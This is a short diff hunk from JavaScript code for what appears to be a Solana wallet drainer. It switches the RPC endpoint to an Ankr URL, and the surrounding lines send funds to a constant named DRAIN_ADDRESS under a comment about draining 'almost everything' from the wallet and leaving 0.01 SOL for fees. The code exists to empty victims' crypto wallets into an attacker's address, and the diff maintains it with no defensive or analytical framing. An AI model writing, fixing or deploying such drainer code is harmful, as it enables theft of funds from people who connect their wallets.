@@ -38,7 +38,7 @@
 
         statusEl.innerText = "Building transaction...";
 
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        const connection = new solanaWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
         const to = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
 
         // Get balance and drain almost everything (leave 0.01 SOL for fees)
